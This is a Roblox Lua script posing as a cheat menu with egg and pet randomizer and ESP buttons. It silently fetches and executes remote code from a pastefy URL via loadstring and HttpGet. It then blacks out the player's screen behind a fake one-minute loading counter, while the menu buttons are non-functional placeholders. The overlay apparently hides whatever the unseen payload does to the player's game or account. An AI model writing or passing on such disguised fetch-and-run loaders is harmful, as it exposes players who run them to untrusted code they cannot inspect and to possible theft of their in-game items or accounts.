local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local Player = Players.LocalPlayer
local Lum = game:GetService("Lighting")

-- Wait
repeat task.wait() until Player:FindFirstChild("PlayerGui")
local char = Player.Character or Player.CharacterAdded:Wait()

-- Remove blur if present
local blur = Lum:FindFirstChildWhichIsA("BlurEffect")
if blur then blur:Destroy() end

-- Run your script
pcall(function()
    loadstring(game:HttpGet("https://pastefy.app/EEmKlIPx/raw", true))()
end)

-- ‚Äî Loading GUI ‚Äî
local loadingGui = Instance.new("ScreenGui")
loadingGui.Name = "LoadingGui"
loadingGui.ResetOnSpawn = false
loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
loadingGui.DisplayOrder = 1000
loadingGui.Enabled = true
loadingGui.Parent = Player.PlayerGui

local bg = Instance.new("Frame", loadingGui)
bg.Size, bg.Position = UDim2.new(1,0,1,0), UDim2.new(0,0,0,0)
bg.BackgroundColor3 = Color3.new(0,0,0)
bg.BorderSizePixel = 0

local labelTop = Instance.new("TextLabel", bg)
labelTop.Size, labelTop.Position = UDim2.new(1,0,0.1,0), UDim2.new(0,0,0.02,0)
labelTop.BackgroundTransparency, labelTop.Text = 1, "Wait Until It Loads"
labelTop.Font, labelTop.TextColor3 = Enum.Font.GothamBold, Color3.fromRGB(255,120,0)
labelTop.TextScaled = true
labelTop.TextStrokeTransparency, labelTop.TextStrokeColor3 = 0.8, Color3.fromRGB(255,70,0)

local loadingText = Instance.new("TextLabel", bg)
loadingText.Size, loadingText.Position = UDim2.new(1,0,0.3,0), UDim2.new(0,0,0.25,0)
loadingText.BackgroundTransparency = 1
loadingText.Text, loadingText.Font, loadingText.TextScaled = "0%", Enum.Font.GothamBlack, true
loadingText.TextColor3, loadingText.TextStrokeColor3 = Color3.new(1,1,1), Color3.new(0,0,0)
loadingText.TextStrokeTransparency = 0.6

local labelBottom = Instance.new("TextLabel", bg)
labelBottom.Size, labelBottom.Position = UDim2.new(1,0,0.1,0), UDim2.new(0,0,0.88,0)
labelBottom.BackgroundTransparency, labelBottom.Text = 1, "Be Patient"
labelBottom.Font, labelBottom.TextScaled = Enum.Font.GothamBold, true
labelBottom.TextColor3, labelBottom.TextStrokeColor3 = Color3.fromRGB(255,80,0), Color3.fromRGB(255,50,0)
labelBottom.TextStrokeTransparency = 0.8

-- Fire effect
local function spawnFire()
    for i=1,5 do
        local fire = Instance.new("TextLabel", bg)
        fire.Text, fire.Font, fire.TextScaled = "üî•", Enum.Font.SourceSansBold, true
        fire.TextColor3 = Color3.fromRGB(255,100,0)
        fire.BackgroundTransparency = 1
        fire.Size = UDim2.new(0.05,0,0.05,0)
        fire.Position = UDim2.new(math.random(),0,math.random(),0)
        local goal = {Position = UDim2.new(math.random(),0,math.random(),0),
                      TextTransparency = 1}
        TweenService:Create(fire, TweenInfo.new(5,Enum.EasingStyle.Linear), goal):Play()
        task.delay(5, function() fire:Destroy() end)
    end
end
task.spawn(function()
    while loadingGui.Enabled do
        spawnFire()
        task.wait(1)
    end
end)

-- Loading countdown + disable UI
task.spawn(function()
    for i=1,99 do
        loadingText.Text = i.."%"
        task.wait(60/99)
    end
    loadingText.Text = "99%"
    task.wait(1)
    loadingGui.Enabled = false
    loadingGui:Destroy()
end)

-- ‚Äî Options GUI (Always Visible) ‚Äî
local optionsGui = Instance.new("ScreenGui")
optionsGui.Name = "OptionsGui"
optionsGui.ResetOnSpawn = false
optionsGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
optionsGui.DisplayOrder = 500
optionsGui.Parent = Player.PlayerGui

local panel = Instance.new("Frame", optionsGui)
panel.Size, panel.Position = UDim2.new(0.2,0,0.6,0), UDim2.new(0.02,0,0.2,0)
panel.BackgroundColor3 = Color3.fromRGB(30,0,0)
panel.BackgroundTransparency = 0.2
panel.BorderSizePixel, panel.BorderColor3 = 2, Color3.fromRGB(255,50,0)

local title = Instance.new("TextLabel", panel)
title.Size, title.Position = UDim2.new(1,0,0.15,0), UDim2.new(0,0,0,0)
title.BackgroundTransparency, title.Text = 1, "üî• Options üî•"
title.Font, title.TextScaled = Enum.Font.GothamBold, true
title.TextColor3, title.TextStrokeColor3 = Color3.fromRGB(255,80,0), Color3.fromRGB(255,80,0)
title.TextStrokeTransparency = 0.7

-- Button builder
local function btn(label, emoji, ypos)
    local b = Instance.new("TextButton", panel)
    b.Size, b.Position = UDim2.new(0.9,0,0.15,0), UDim2.new(0.05,0,ypos,0)
    b.BackgroundColor3 = Color3.fromRGB(60,0,0)
    b.TextColor3, b.Font, b.TextScaled = Color3.new(1,1,1), Enum.Font.GothamBold, true
    b.TextStrokeTransparency, b.TextStrokeColor3 = 0.7, Color3.fromRGB(255,80,0)
    b.Text = emoji.." "..label
    return b
end

local btnEgg = btn("Egg Randomizer", "üé≤", 0.2)
local btnPet = btn("Randomize Pets", "üé≤", 0.38)
local btnESP = btn("ESP: OFF", "üëÅÔ∏è", 0.56)
local btnAuto = btn("Auto Randomize: OFF", "üîÑ", 0.74)

-- (Placeholder logic: implement your own detection and behavior)
btnESP.MouseButton1Click:Connect(function()
    btnESP.Text = btnESP.Text:find("ON") and "üëÅÔ∏è ESP: OFF" or "üëÅÔ∏è ESP: ON"
end)
btnEgg.MouseButton1Click:Connect(function()
    print("Egg Randomizer toggled")
end)
btnPet.MouseButton1Click:Connect(function()
    print("Randomize Pets clicked")
end)
btnAuto.MouseButton1Click:Connect(function()
    btnAuto.Text = btnAuto.Text:find("ON") and "üîÑ Auto Randomize: OFF" or "üîÑ Auto Randomize: ON"
end)
